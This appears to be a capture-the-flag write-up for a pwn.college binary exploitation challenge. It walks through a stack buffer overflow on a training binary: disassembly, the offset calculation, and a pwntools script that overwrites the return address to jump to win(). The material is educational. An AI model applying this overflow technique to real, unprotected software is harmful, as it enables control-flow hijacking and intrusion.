---
layout: post
title: Control_Hijack_Hard
date: 2026-05-31 22:56 -0400
published: true
categories: ["Binary Exploitation","Pwn College"]
tags: ["Buffer Overflow", "Static analysis","PIEs"]
toc: true
---
# WriteUp — Control Hijack (Hard)

## Challenge

**Source**: PwnCollege — Binary Exploitation track
**Binary**: `binary-exploitation-control-hijack`
**Objective**: Stack smash — overwrite return address to hijack control flow to `win()`. No debug output, no source code.

## Binary properties (checksec)

| Mitigation   | Status                  |
| ------------ | ----------------------- |
| Arch         | amd64-64-little         |
| RELRO        | Full RELRO              |
| Stack Canary | **Disabled**            |
| NX           | Enabled                 |
| PIE          | **Disabled** (0x400000) |
| Stripped     | No                      |

## Reverse engineering

### Step 1: Verify no canary

`checksec` shows "No canary found". Confirmed by absence of `mov %fs:0x28,%rax` and `__stack_chk_fail` calls in `challenge()`.

### Step 2: Disassemble `challenge()`

```asm
challenge:
    push   %rbp
    mov    %rsp,%rbp
    sub    $0x60,%rsp               ; 96-byte stack frame

    ; Buffer zero-init: 6 qwords + 1 word = 50 bytes
    movq   $0x0,-0x40(%rbp)         ; input[0..7]
    movq   $0x0,-0x38(%rbp)         ; input[8..15]
    movq   $0x0,-0x30(%rbp)         ; input[16..23]
    movq   $0x0,-0x28(%rbp)         ; input[24..31]
    movq   $0x0,-0x20(%rbp)         ; input[32..39]
    movq   $0x0,-0x18(%rbp)         ; input[40..47]
    movw   $0x0,-0x10(%rbp)         ; input[48..49]

    movq   $0x1000,-0x8(%rbp)       ; size = 4096 @ rbp-0x8

    lea    -0x40(%rbp),%rax         ; input buffer @ rbp-0x40
    call   read@plt                 ; read(0, input, 4096)
    mov    %eax,-0xc(%rbp)          ; received @ rbp-0xc

    ; No variable checks — just prints Goodbye and returns
    call   puts                     ; "Goodbye!"
    mov    $0x0,%eax
    leaveq                          ; mov rsp,rbp; pop rbp
    retq                            ; pop rip ← TARGET
```

### Step 3: Calculate offset to return address

```
input   @ rbp-0x40 = rbp-64
ret addr @ rbp+0x08
──────────────────────
offset  = (rbp+8) - (rbp-64) = 72 bytes
```

### Step 4: Get win() address

```
$ objdump -t binary-exploitation-control-hijack | grep win
0000000000401d32 g F .text  000000c2 win
```

`win()` @ **0x401d32** (fixed, no PIE).

### Stack layout

```
Offset from input:  Contents
─────────────────────────────────
  0 – 49             input[50]           (6×8 + 2 byte init)
 50 – 51             padding / gap       (2 bytes)
 52 – 55             received (int)      (4 bytes)
 56 – 63             size (unsigned long)(8 bytes)
 64 – 71             saved RBP           (8 bytes)
 72 – 79             return address      ← OVERWRITE with 0x401d32
```

## Exploit strategy

Payload: **72 bytes junk + p64(0x401d32)** = 80 bytes.

When `leave; ret` executes:
1. `leave` → `mov rsp, rbp; pop rbp` (RBP = 0x4141414141414141, ignored)
2. `ret` → pops `0x401d32` into RIP → **win()**

## Exploit script

```python
#!/usr/bin/env python3
from pwn import *
import os

context.arch = 'amd64'
context.log_level = 'info'

BIN = '/challenge/binary-exploitation-control-hijack' if os.path.exists(
    '/challenge/binary-exploitation-control-hijack'
) else './binary-exploitation-control-hijack'

elf = ELF(BIN)
p = process(elf.path)

offset_to_ret = 72           # (rbp+8) - (rbp-0x40)
win_addr = elf.symbols['win']  # 0x401d32

pay  = b'A' * offset_to_ret
pay += p64(win_addr)

p.sendafter(b'Send your payload', pay)
output = p.recvall(timeout=2)
print(output.decode(errors='replace'))
```


## Key takeaways

1. **Zero-initialization reveals buffer size** — 6 `movq` + 1 `movw` = 50 bytes. No source needed.
2. **Offset = distance between two stack slots** — `lea -0x40(%rbp)` gives input, `rbp+8` is standard for return address. Simple subtraction: 8 + 64 = 72.
3. **No canary check in the code** — verified by scanning for `fs:0x28` and `__stack_chk_fail` calls. Their absence = free pass to overwrite return address.
4. **`leave; ret` is deterministic** — the epilogue always restores from `rbp+0` (saved RBP) and `rbp+8` (return address). Understanding this calling convention is the foundation of stack smashing.
